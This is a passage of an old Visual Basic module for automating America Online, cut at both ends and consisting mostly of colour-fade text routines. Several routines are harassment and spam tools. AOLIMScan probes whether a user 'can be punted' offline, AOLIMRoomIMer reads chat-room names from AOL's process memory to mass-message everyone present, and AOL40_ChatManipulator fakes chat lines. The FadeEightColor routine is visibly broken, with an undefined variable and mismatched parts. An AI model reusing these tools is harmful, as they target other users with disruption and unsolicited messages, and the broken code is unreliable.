edit% = GetWindow(edit%, GW_HWNDNEXT)
edit% = GetWindow(edit%, GW_HWNDNEXT)
edit% = GetWindow(edit%, GW_HWNDNEXT)
edit% = GetWindow(edit%, GW_HWNDNEXT)
edit% = GetWindow(edit%, GW_HWNDNEXT)
edit% = GetWindow(edit%, GW_HWNDNEXT)
edit% = GetWindow(edit%, GW_HWNDNEXT)
edit% = GetWindow(edit%, GW_HWNDNEXT)
edit% = GetWindow(edit%, GW_HWNDNEXT)
edit% = GetWindow(edit%, GW_HWNDNEXT)
edit% = GetWindow(edit%, GW_HWNDNEXT)
edit% = GetWindow(edit%, GW_HWNDNEXT)
edit% = GetWindow(edit%, GW_HWNDNEXT)
edit% = GetWindow(edit%, GW_HWNDNEXT)
edit% = GetWindow(edit%, GW_HWNDNEXT)
edit% = GetWindow(edit%, GW_HWNDNEXT)
AOLIcon edit%
Pause (1)
Save% = GetWindow(edit%, GW_HWNDNEXT)
Save% = GetWindow(Save%, GW_HWNDNEXT)
Save% = GetWindow(Save%, GW_HWNDNEXT)
AOLIcon Save%
End Sub

Sub AOLMainMenu()
Call RunMenu(2, 3)
End Sub
Sub AOLMakeMeParent(frm As Form)
AOL% = FindChildByClass(FindWindow("AOL Frame25", 0&), "MDIClient")
SetAsParent = SetParent(frm.hWnd, AOL%)
End Sub
Public Sub AOLOnlineChecker(person)
Call AOLInstantMessage4(person, "Sup?")
Pause 2
AOLIMScan
End Sub
Function AOLIMScan()
aolcl% = FindWindow("#32770", "America Online")
If aolcl% > 0 Then
Do: DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
im% = FindChildByTitle(MDI%, "Send Instant Message")
aolcl% = FindWindow("#32770", "America Online")
If aolcl% <> 0 Then closer = SendMessage(aolcl%, WM_CLOSE, 0, 0): closer2 = SendMessage(im%, WM_CLOSE, 0, 0): Exit Do
If im% = 0 Then Exit Do
Loop
MsgBox "This person has their IMs OFF and can't be punted."
End If
If aolcl% = 0 Then
Do: DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
im% = FindChildByTitle(MDI%, "Send Instant Message")
aolcl% = FindWindow("#32770", "America Online")
If aolcl% <> 0 Then closer = SendMessage(aolcl%, WM_CLOSE, 0, 0): closer2 = SendMessage(im%, WM_CLOSE, 0, 0): Exit Do
If im% = 0 Then Exit Do
Loop
MsgBox "This person has their IMs ON and can be punted."
End If
End Function
Function AOLimStatic(newcaption As String)
ANTI1% = FindChildByTitle(AOLMDI(), ">Instant Message From:")
STS% = FindChildByClass(ANTI1%, "_AOL_Static")
ST% = GetWindow(STS%, GW_HWNDNEXT)
ST% = GetWindow(ST%, GW_HWNDNEXT)
Call ChangeCaption(newcaption)
End Function
Function AOLIMRoomIMer(Mess As String)
AOLIsOnline
If AOLIsOnline = 0 Then GoTo last


On Error Resume Next

Dim AOLProcess As Long
Dim ListItemHold As Long
Dim person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
    

room = AOLFindRoom()
aolhandle = FindChildByClass(room, "_AOL_Listbox")

AOLThread = GetWindowThreadProcessId(aolhandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)

If AOLProcessThread Then
For Index = 0 To SendMessage(aolhandle, LB_GETCOUNT, 0, 0) - 1
person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(aolhandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, person$, 4, ReadBytes)
                        
Call RtlMoveMemory(ListPersonHold, ByVal person$, 4)
ListPersonHold = ListPersonHold + 6

person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, person$, Len(person$), ReadBytes)

person$ = Left$(person$, InStr(person$, vbNullChar) - 1)
Call AOLInstantMessage(person$, Mess)
Next Index
Call CloseHandle(AOLProcessThread)
End If
last:
End Function


Sub AOL40_UnUpChat()
AOM% = FindWindow("_AOL_Modal", vbNullString)
DoEvents
X = ShowWindow(AOM%, SW_RESTORE)
X = ShowWindow(AOM%, SW_SHOW)
X = SetFocusAPI(AOM%)
End Sub
Function AOL40_UpChat()
AOL% = FindWindow("AOL Frame25", vbNullString)
AOModal% = FindChildByClass(AOL%, "_AOL_Modal")
AOGauge% = FindChildByClass(AOModal%, "_AOL_Gauge")
If AOGauge% <> 0 Then Upp% = AOModal%
AOM% = FindWindow("_AOL_Modal", vbNullString)
DoEvents
X = ShowWindow(AOM%, SW_MINIMIZE)
X = SetFocusAPI(AOL%)
Call EnableWindow(AOL%, 1)
Call EnableWindow(Upp%, 0)
End Function
Sub AOL40_ClearChat4u()
'This clears it for you only
childs% = XAOL4_FindRoom()
child = FindChildByClass(childs%, "RICHCNTL")
GetTrim = SendMessageByNum(child, 13, 0&, 0&)
TrimSpace$ = Space$(GetTrim)
getstring = SendMessageByString(child, 12, GetTrim + 1, TrimSpace$)
theview$ = TrimSpace$
End Sub
Sub AOL40_ChatManipulator(who$, what$)
view% = FindChildByClass(XAOL4_FindRoom(), "RICHCNTL")
Buffy$ = Chr$(13) & Chr$(10) & "" & (who$) & ":" & Chr$(9) & "" & (what$) & ""
X% = SendMessageByString(view%, WM_SETTEXT, 0, Buffy$)
End Sub
Sub FormFade(FormX As Form, Colr1, Colr2)
'by monk-e-god (modified from a sub by MaRZ)
    B1 = GetRGB(Colr1).blue
    G1 = GetRGB(Colr1).green
    R1 = GetRGB(Colr1).red
    B2 = GetRGB(Colr2).blue
    G2 = GetRGB(Colr2).green
    R2 = GetRGB(Colr2).red
    
    On Error Resume Next
    Dim intLoop As Integer
    FormX.DrawStyle = vbInsideSolid
    FormX.DrawMode = vbCopyPen
    FormX.ScaleMode = vbPixels
    FormX.DrawWidth = 2
    FormX.ScaleHeight = 256
    For intLoop = 0 To 255
        FormX.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(((R2 - R1) / 255 * intLoop) + R1, ((G2 - G1) / 255 * intLoop) + G1, ((B2 - B1) / 255 * intLoop) + B1), B
    Next intLoop
End Sub

Sub FadeForm(FormX As Form, Colr1, Colr2)
'by monk-e-god (modified from a sub by MaRZ)
    B1 = GetRGB(Colr1).blue
    G1 = GetRGB(Colr1).green
    R1 = GetRGB(Colr1).red
    B2 = GetRGB(Colr2).blue
    G2 = GetRGB(Colr2).green
    R2 = GetRGB(Colr2).red
    
    On Error Resume Next
    Dim intLoop As Integer
    FormX.DrawStyle = vbInsideSolid
    FormX.DrawMode = vbCopyPen
    FormX.ScaleMode = vbPixels
    FormX.DrawWidth = 2
    FormX.ScaleHeight = 256
    For intLoop = 0 To 255
        FormX.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(((R2 - R1) / 255 * intLoop) + R1, ((G2 - G1) / 255 * intLoop) + G1, ((B2 - B1) / 255 * intLoop) + B1), B
    Next intLoop
End Sub
Sub FadePreview(PicB As PictureBox, ByVal FadedText As String)
'by aDRaMoLEk
FadedText$ = Replacer(FadedText$, Chr(13), "+chr13+")
OSM = PicB.ScaleMode
PicB.ScaleMode = 3
TextOffX = 0: TextOffY = 0
StartX = 2: StartY = 0
PicB.Font = "Arial": PicB.FontSize = 10
PicB.FontBold = False: PicB.FontItalic = False: PicB.FontUnderline = False: PicB.FontStrikethru = False
PicB.AutoRedraw = True: PicB.ForeColor = 0&: PicB.Cls
For X = 1 To Len(FadedText$)
  c$ = Mid$(FadedText$, X, 1)
  If c$ = "<" Then
    TagStart = X + 1
    TagEnd = InStr(X + 1, FadedText$, ">") - 1
    T$ = LCase$(Mid$(FadedText$, TagStart, (TagEnd - TagStart) + 1))
    X = TagEnd + 1
    Select Case T$
      Case "u"
        PicB.FontUnderline = True
      Case "/u"
        PicB.FontUnderline = False
      Case "s"
        PicB.FontStrikethru = True
      Case "/s"
        PicB.FontStrikethru = False
      Case "b"    'start bold
        PicB.FontBold = True
      Case "/b"   'stop bold
        PicB.FontBold = False
      Case "i"    'start italic
        PicB.FontItalic = True
      Case "/i"   'stop italic
        PicB.FontItalic = False
      Case "sup"  'start superscript
        TextOffY = -1
      Case "/sup" 'end superscript
        TextOffY = 0
      Case "sub"  'start subscript
        TextOffY = 1
      Case "/sub" 'end subscript
        TextOffY = 0
      Case Else
        If Left$(T$, 10) = "font color" Then 'change font color
          ColorStart = InStr(T$, "#")
          ColorString$ = Mid$(T$, ColorStart + 1, 6)
          RedString$ = Left$(ColorString$, 2)
          GreenString$ = Mid$(ColorString$, 3, 2)
          BlueString$ = Right$(ColorString$, 2)
          RV = Hex2Dec!(RedString$)
          GV = Hex2Dec!(GreenString$)
          BV = Hex2Dec!(BlueString$)
          PicB.ForeColor = RGB(RV, GV, BV)
        End If
        If Left$(T$, 9) = "font face" Then 'added by monk-e-god
            fontstart% = InStr(T$, Chr(34))
            dafont$ = Right(T$, Len(T$) - fontstart%)
            PicB.Font = dafont$
        End If
    End Select
  Else  'normal text
    If c$ = "+" And Mid(FadedText$, X, 7) = "+chr13+" Then ' added by monk-e-god
        StartY = StartY + 16
        TextOffX = 0
        X = X + 6
    Else
        PicB.CurrentY = StartY + TextOffY
        PicB.CurrentX = StartX + TextOffX
        PicB.Print c$
        TextOffX = TextOffX + PicB.TextWidth(c$)
    End If
  End If
Next X
PicB.ScaleMode = OSM
End Sub

Function GetRGB(ByVal CVal As Long) As COLORRGB
  GetRGB.blue = Int(CVal / 65536)
  GetRGB.green = Int((CVal - (65536 * GetRGB.blue)) / 256)
  GetRGB.red = CVal - (65536 * GetRGB.blue + 256 * GetRGB.green)
End Function
Sub FadePreview2(RichTB As Control, ByVal FadedText As String)
'Modified by monk-e-god for use in a RichTextBox

'NOTE: RichTB must be a RichTextBox.
'NOTE: You cannot preview wavy fades with this sub.
Dim StartPlace%
StartPlace% = 0
RichTB.SelStart = StartPlace%
RichTB.Font = "Arial": RichTB.SelFontSize = 10
RichTB.SelBold = False: RichTB.SelItalic = False: RichTB.SelUnderline = False: RichTB.SelStrikeThru = False
RichTB.SelColor = 0&: RichTB.text = ""
For X = 1 To Len(FadedText$)
  c$ = Mid$(FadedText$, X, 1)
  RichTB.SelStart = StartPlace%
  RichTB.SelLength = 1
  If c$ = "<" Then
    TagStart = X + 1
    TagEnd = InStr(X + 1, FadedText$, ">") - 1
    T$ = LCase$(Mid$(FadedText$, TagStart, (TagEnd - TagStart) + 1))
    X = TagEnd + 1
    RichTB.SelStart = StartPlace%
    RichTB.SelLength = 1
    Select Case T$
      Case "u"
        RichTB.SelUnderline = True
      Case "/u"
        RichTB.SelUnderline = False
      Case "s"
        RichTB.SelStrikeThru = True
      Case "/s"
        RichTB.SelStrikeThru = False
      Case "b"    'start bold
        RichTB.SelBold = True
      Case "/b"   'stop bold
        RichTB.SelBold = False
      Case "i"    'start italic
        RichTB.SelItalic = True
      Case "/i"   'stop italic
        RichTB.SelItalic = False
      
      Case Else
        If Left$(T$, 10) = "font color" Then 'change font color
          ColorStart = InStr(T$, "#")
          ColorString$ = Mid$(T$, ColorStart + 1, 6)
          RedString$ = Left$(ColorString$, 2)
          GreenString$ = Mid$(ColorString$, 3, 2)
          BlueString$ = Right$(ColorString$, 2)
          RV = Hex2Dec!(RedString$)
          GV = Hex2Dec!(GreenString$)
          BV = Hex2Dec!(BlueString$)
          RichTB.SelStart = StartPlace%
          RichTB.SelColor = RGB(RV, GV, BV)
        End If
        If Left$(T$, 9) = "font face" Then
            fontstart% = InStr(T$, Chr(34))
            dafont$ = Right(T$, Len(T$) - fontstart%)
            RichTB.SelStart = StartPlace%
            RichTB.SelFontName = dafont$
        End If
    End Select
  Else  'normal text
    RichTB.SelText = RichTB.SelText + c$
    StartPlace% = StartPlace% + 1
    RichTB.SelStart = StartPlace%
  End If
Next X
End Sub

Function Hex2Dec!(ByVal strHex$)
'by aDRaMoLEk
  If Len(strHex$) > 8 Then strHex$ = Right$(strHex$, 8)
  Hex2Dec = 0
  For X = Len(strHex$) To 1 Step -1
    CurCharVal = GETVAL(Mid$(UCase$(strHex$), X, 1))
    Hex2Dec = Hex2Dec + CurCharVal * 16 ^ (Len(strHex$) - X)
  Next X
End Function

Function GETVAL%(ByVal strLetter$)
'by aDRaMoLEk
  Select Case strLetter$
    Case "0"
      GETVAL = 0
    Case "1"
      GETVAL = 1
    Case "2"
      GETVAL = 2
    Case "3"
      GETVAL = 3
    Case "4"
      GETVAL = 4
    Case "5"
      GETVAL = 5
    Case "6"
      GETVAL = 6
    Case "7"
      GETVAL = 7
    Case "8"
      GETVAL = 8
    Case "9"
      GETVAL = 9
    Case "A"
      GETVAL = 10
    Case "B"
      GETVAL = 11
    Case "C"
      GETVAL = 12
    Case "D"
      GETVAL = 13
    Case "E"
      GETVAL = 14
    Case "F"
      GETVAL = 15
  End Select
End Function

Function CLRBars(RedBar As Control, GreenBar As Control, BlueBar As Control)
'This gets a color from 3 scroll bars
CLRBars = RGB(RedBar.Value, GreenBar.Value, BlueBar.Value)

'Put this in the scroll event of the
'3 scroll bars RedScroll1, GreenScroll1,
'& BlueScroll1.  It changes the backcolor
'of ColorLbl when you scroll the bars
'ColorLbl.BackColor = CLRBars(RedScroll1, GreenScroll1, BlueScroll1)

End Function

Function FadeByColor10(Colr1, Colr2, Colr3, Colr4, Colr5, Colr6, Colr7, Colr8, Colr9, Colr10, thetext$, WavY As Boolean)
'by monk-e-god
dacolor1$ = RGBtoHEX(Colr1)
dacolor2$ = RGBtoHEX(Colr2)
dacolor3$ = RGBtoHEX(Colr3)
dacolor4$ = RGBtoHEX(Colr4)
dacolor5$ = RGBtoHEX(Colr5)
dacolor6$ = RGBtoHEX(Colr6)
dacolor7$ = RGBtoHEX(Colr7)
dacolor8$ = RGBtoHEX(Colr8)
dacolor9$ = RGBtoHEX(Colr9)
dacolor10$ = RGBtoHEX(Colr10)

rednum1% = Val("&H" + Right(dacolor1$, 2))
greennum1% = Val("&H" + Mid(dacolor1$, 3, 2))
bluenum1% = Val("&H" + Left(dacolor1$, 2))
rednum2% = Val("&H" + Right(dacolor2$, 2))
greennum2% = Val("&H" + Mid(dacolor2$, 3, 2))
bluenum2% = Val("&H" + Left(dacolor2$, 2))
rednum3% = Val("&H" + Right(dacolor3$, 2))
greennum3% = Val("&H" + Mid(dacolor3$, 3, 2))
bluenum3% = Val("&H" + Left(dacolor3$, 2))
rednum4% = Val("&H" + Right(dacolor4$, 2))
greennum4% = Val("&H" + Mid(dacolor4$, 3, 2))
bluenum4% = Val("&H" + Left(dacolor4$, 2))
rednum5% = Val("&H" + Right(dacolor5$, 2))
greennum5% = Val("&H" + Mid(dacolor5$, 3, 2))
bluenum5% = Val("&H" + Left(dacolor5$, 2))
rednum6% = Val("&H" + Right(dacolor6$, 2))
greennum6% = Val("&H" + Mid(dacolor6$, 3, 2))
bluenum6% = Val("&H" + Left(dacolor6$, 2))
rednum7% = Val("&H" + Right(dacolor7$, 2))
greennum7% = Val("&H" + Mid(dacolor7$, 3, 2))
bluenum7% = Val("&H" + Left(dacolor7$, 2))
rednum8% = Val("&H" + Right(dacolor8$, 2))
greennum8% = Val("&H" + Mid(dacolor8$, 3, 2))
bluenum8% = Val("&H" + Left(dacolor8$, 2))
rednum9% = Val("&H" + Right(dacolor9$, 2))
greennum9% = Val("&H" + Mid(dacolor9$, 3, 2))
bluenum9% = Val("&H" + Left(dacolor9$, 2))
rednum10% = Val("&H" + Right(dacolor10$, 2))
greennum10% = Val("&H" + Mid(dacolor10$, 3, 2))
bluenum10% = Val("&H" + Left(dacolor10$, 2))


FadeByColor10 = FadeTenColor(rednum1%, greennum1%, bluenum1%, rednum2%, greennum2%, bluenum2%, rednum3%, greennum3%, bluenum3%, rednum4%, greennum4%, bluenum4%, rednum5%, greennum5%, bluenum5%, rednum6%, greennum6%, bluenum6%, rednum7%, greennum7%, bluenum7%, rednum8%, greennum8%, bluenum8%, rednum9%, greennum9%, bluenum9%, rednum10%, greennum10%, bluenum10%, thetext, WavY)

End Function

Function FadeByColor2(Colr1, Colr2, thetext$, WavY As Boolean)
'by monk-e-god
dacolor1$ = RGBtoHEX(Colr1)
dacolor2$ = RGBtoHEX(Colr2)

rednum1% = Val("&H" + Right(dacolor1$, 2))
greennum1% = Val("&H" + Mid(dacolor1$, 3, 2))
bluenum1% = Val("&H" + Left(dacolor1$, 2))
rednum2% = Val("&H" + Right(dacolor2$, 2))
greennum2% = Val("&H" + Mid(dacolor2$, 3, 2))
bluenum2% = Val("&H" + Left(dacolor2$, 2))

FadeByColor2 = FadeTwoColor(rednum1%, greennum1%, bluenum1%, rednum2%, greennum2%, bluenum2%, thetext, WavY)

End Function
Function FadeByColor3(Colr1, Colr2, Colr3, thetext$, WavY As Boolean)
'by monk-e-god
dacolor1$ = RGBtoHEX(Colr1)
dacolor2$ = RGBtoHEX(Colr2)
dacolor3$ = RGBtoHEX(Colr3)

rednum1% = Val("&H" + Right(dacolor1$, 2))
greennum1% = Val("&H" + Mid(dacolor1$, 3, 2))
bluenum1% = Val("&H" + Left(dacolor1$, 2))
rednum2% = Val("&H" + Right(dacolor2$, 2))
greennum2% = Val("&H" + Mid(dacolor2$, 3, 2))
bluenum2% = Val("&H" + Left(dacolor2$, 2))
rednum3% = Val("&H" + Right(dacolor3$, 2))
greennum3% = Val("&H" + Mid(dacolor3$, 3, 2))
bluenum3% = Val("&H" + Left(dacolor3$, 2))

FadeByColor3 = FadeThreeColor(rednum1%, greennum1%, bluenum1%, rednum2%, greennum2%, bluenum2%, rednum3%, greennum3%, bluenum3%, thetext, WavY)

End Function
Function FadeByColor4(Colr1, Colr2, Colr3, Colr4, thetext$, WavY As Boolean)
'by monk-e-god
dacolor1$ = RGBtoHEX(Colr1)
dacolor2$ = RGBtoHEX(Colr2)
dacolor3$ = RGBtoHEX(Colr3)
dacolor4$ = RGBtoHEX(Colr4)

rednum1% = Val("&H" + Right(dacolor1$, 2))
greennum1% = Val("&H" + Mid(dacolor1$, 3, 2))
bluenum1% = Val("&H" + Left(dacolor1$, 2))
rednum2% = Val("&H" + Right(dacolor2$, 2))
greennum2% = Val("&H" + Mid(dacolor2$, 3, 2))
bluenum2% = Val("&H" + Left(dacolor2$, 2))
rednum3% = Val("&H" + Right(dacolor3$, 2))
greennum3% = Val("&H" + Mid(dacolor3$, 3, 2))
bluenum3% = Val("&H" + Left(dacolor3$, 2))
rednum4% = Val("&H" + Right(dacolor4$, 2))
greennum4% = Val("&H" + Mid(dacolor4$, 3, 2))
bluenum4% = Val("&H" + Left(dacolor4$, 2))

FadeByColor4 = FadeFourColor(rednum1%, greennum1%, bluenum1%, rednum2%, greennum2%, bluenum2%, rednum3%, greennum3%, bluenum3%, rednum4%, greennum4%, bluenum4%, thetext, WavY)

End Function

Function FadeByColor5(Colr1, Colr2, Colr3, Colr4, Colr5, thetext$, WavY As Boolean)
'by monk-e-god
dacolor1$ = RGBtoHEX(Colr1)
dacolor2$ = RGBtoHEX(Colr2)
dacolor3$ = RGBtoHEX(Colr3)
dacolor4$ = RGBtoHEX(Colr4)
dacolor5$ = RGBtoHEX(Colr5)

rednum1% = Val("&H" + Right(dacolor1$, 2))
greennum1% = Val("&H" + Mid(dacolor1$, 3, 2))
bluenum1% = Val("&H" + Left(dacolor1$, 2))
rednum2% = Val("&H" + Right(dacolor2$, 2))
greennum2% = Val("&H" + Mid(dacolor2$, 3, 2))
bluenum2% = Val("&H" + Left(dacolor2$, 2))
rednum3% = Val("&H" + Right(dacolor3$, 2))
greennum3% = Val("&H" + Mid(dacolor3$, 3, 2))
bluenum3% = Val("&H" + Left(dacolor3$, 2))
rednum4% = Val("&H" + Right(dacolor4$, 2))
greennum4% = Val("&H" + Mid(dacolor4$, 3, 2))
bluenum4% = Val("&H" + Left(dacolor4$, 2))
rednum5% = Val("&H" + Right(dacolor5$, 2))
greennum5% = Val("&H" + Mid(dacolor5$, 3, 2))
bluenum5% = Val("&H" + Left(dacolor5$, 2))

FadeByColor5 = FadeFiveColor(rednum1%, greennum1%, bluenum1%, rednum2%, greennum2%, bluenum2%, rednum3%, greennum3%, bluenum3%, rednum4%, greennum4%, bluenum4%, rednum5%, greennum5%, bluenum5%, thetext, WavY)

End Function

Function FadeFiveColor(R1%, G1%, B1%, R2%, G2%, B2%, R3%, G3%, B3%, R4%, G4%, B4%, R5%, G5%, B5%, thetext$, WavY As Boolean)
'by monk-e-god
    Dim WaveState%
    Dim WaveHTML$
    WaveState = 0
    
    textlen% = Len(thetext)
    
    Do: DoEvents
    fstlen% = fstlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    seclen% = seclen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    thrdlen% = thrdlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    frthlen% = frthlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    Loop Until textlen% < 1
    
    part1$ = Left(thetext, fstlen%)
    part2$ = Mid(thetext, fstlen% + 1, seclen%)
    part3$ = Mid(thetext, fstlen% + seclen% + 1, thrdlen%)
    part4$ = Right(thetext, frthlen%)
    
    'part1
    textlen% = Len(part1$)
    For i = 1 To textlen%
        TextDone$ = Left(part1$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B2 - B1) / textlen% * i) + B1, ((G2 - G1) / textlen% * i) + G1, ((R2 - R1) / textlen% * i) + R1)
        colorx2 = RGBtoHEX(colorx)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 10 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        If WaveState = 5 Then WaveHTML = "<sup>"
        If WaveState = 6 Then WaveHTML = "</sup>"
        If WaveState = 7 Then WaveHTML = "<sub>"
        If WaveState = 8 Then WaveHTML = "</sub>"
        If WaveState = 9 Then WaveHTML = "<sup>"
        If WaveState = 10 Then WaveHTML = "</sup>"
        Else
        WaveHTML = ""
        End If
        
        Faded1$ = Faded1$ + "<Font Color=#" & colorx2 & ">" + WaveHTML + LastChr$
    Next i
    'part2
    textlen% = Len(part2$)
    For i = 1 To textlen%
        TextDone$ = Left(part2$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B3 - B2) / textlen% * i) + B2, ((G3 - G2) / textlen% * i) + G2, ((R3 - R2) / textlen% * i) + R2)
        colorx2 = RGBtoHEX(colorx)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 10 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        If WaveState = 5 Then WaveHTML = "<sup>"
        If WaveState = 6 Then WaveHTML = "</sup>"
        If WaveState = 7 Then WaveHTML = "<sub>"
        If WaveState = 8 Then WaveHTML = "</sub>"
        If WaveState = 9 Then WaveHTML = "<sup>"
        If WaveState = 10 Then WaveHTML = "</sup>"
        Else
        WaveHTML = ""
        End If
        
        Faded2$ = Faded2$ + "<Font Color=#" & colorx2 & ">" + WaveHTML + LastChr$
    Next i
    
    'part3
    textlen% = Len(part3$)
    For i = 1 To textlen%
        TextDone$ = Left(part3$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B4 - B3) / textlen% * i) + B3, ((G4 - G3) / textlen% * i) + G3, ((R4 - R3) / textlen% * i) + R3)
        colorx2 = RGBtoHEX(colorx)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 10 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        If WaveState = 5 Then WaveHTML = "<sup>"
        If WaveState = 6 Then WaveHTML = "</sup>"
        If WaveState = 7 Then WaveHTML = "<sub>"
        If WaveState = 8 Then WaveHTML = "</sub>"
        If WaveState = 9 Then WaveHTML = "<sup>"
        If WaveState = 10 Then WaveHTML = "</sup>"
        Else
        WaveHTML = ""
        End If
        
        Faded3$ = Faded3$ + "<Font Color=#" & colorx2 & ">" + WaveHTML + LastChr$
    Next i
    
    'part4
    textlen% = Len(part4$)
    For i = 1 To textlen%
        TextDone$ = Left(part4$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B5 - B4) / textlen% * i) + B4, ((G5 - G4) / textlen% * i) + G4, ((R5 - R4) / textlen% * i) + R4)
        colorx2 = RGBtoHEX(colorx)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 10 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        If WaveState = 5 Then WaveHTML = "<sup>"
        If WaveState = 6 Then WaveHTML = "</sup>"
        If WaveState = 7 Then WaveHTML = "<sub>"
        If WaveState = 8 Then WaveHTML = "</sub>"
        If WaveState = 9 Then WaveHTML = "<sup>"
        If WaveState = 10 Then WaveHTML = "</sup>"
        Else
        WaveHTML = ""
        End If
        
        Faded4$ = Faded4$ + "<Font Color=#" & colorx2 & ">" + WaveHTML + LastChr$
    Next i
    
    FadeFiveColor = Faded1$ + Faded2$ + Faded3$ + Faded4$
End Function
Function FadeEightColor(R1%, G1%, B1%, R2%, G2%, B2%, R3%, G3%, B3%, R4%, G4%, B4%, R5%, G5%, B5%, R6%, G6%, B6%, R7%, G7%, B7%, R8%, G8%, B8%, thetext$, WavY As Boolean)
'by monk-e-god
    Dim WaveState%
    Dim WaveHTML$
    WaveState = 0
    
    textlen% = Len(thetext)
    
    Do: DoEvents
    fstlen% = fstlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    seclen% = seclen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    thrdlen% = thrdlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    frthlen% = frthlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    fithlen% = fithlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    sixlen% = sixlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    seclen% = seclen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    eightlen% = eightlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    Loop Until textlen% < 1
    
    part1$ = Left(thetext, fstlen%)
    part2$ = Mid(thetext, fstlen% + 1, seclen%)
    part3$ = Mid(thetext, fstlen% + seclen% + 1, thrdlen%)
    part4$ = Mid(thetext, fstlen% + seclen% + thrdlen% + 1, frthlen%)
    part5$ = Mid(thetext, fstlen% + seclen% + thrdlen% + frthlen% + 1, fithlen%)
    part6$ = Mid(thetext, fstlen% + seclen% + thrdlen% + frthlen% + fithlen% + 1, sixlen%)
    part7$ = Right(thetext, eightlen%)
    
    'part1
    textlen% = Len(part1$)
    For i = 1 To textlen%
        TextDone$ = Left(part1$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B2 - B1) / textlen% * i) + B1, ((G2 - G1) / textlen% * i) + G1, ((R2 - R1) / textlen% * i) + R1)
        colorx2 = RGBtoHEX(colorx)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 10 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        If WaveState = 5 Then WaveHTML = "<sup>"
        If WaveState = 6 Then WaveHTML = "</sup>"
        If WaveState = 7 Then WaveHTML = "<sub>"
        If WaveState = 8 Then WaveHTML = "</sub>"
        If WaveState = 9 Then WaveHTML = "<sup>"
        If WaveState = 10 Then WaveHTML = "</sup>"
        Else
        WaveHTML = ""
        End If
        
        Faded1$ = Faded1$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    'part2
    textlen% = Len(part2$)
    For i = 1 To textlen%
        TextDone$ = Left(part2$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B3 - B2) / textlen% * i) + B2, ((G3 - G2) / textlen% * i) + G2, ((R3 - R2) / textlen% * i) + R2)
        colorx2 = RGBtoHEX(colorx)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 10 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        If WaveState = 5 Then WaveHTML = "<sup>"
        If WaveState = 6 Then WaveHTML = "</sup>"
        If WaveState = 7 Then WaveHTML = "<sub>"
        If WaveState = 8 Then WaveHTML = "</sub>"
        If WaveState = 9 Then WaveHTML = "<sup>"
        If WaveState = 10 Then WaveHTML = "</sup>"
        Else
        WaveHTML = ""
        End If
        
        Faded2$ = Faded2$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part3
    textlen% = Len(part3$)
    For i = 1 To textlen%
        TextDone$ = Left(part3$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B4 - B3) / textlen% * i) + B3, ((G4 - G3) / textlen% * i) + G3, ((R4 - R3) / textlen% * i) + R3)
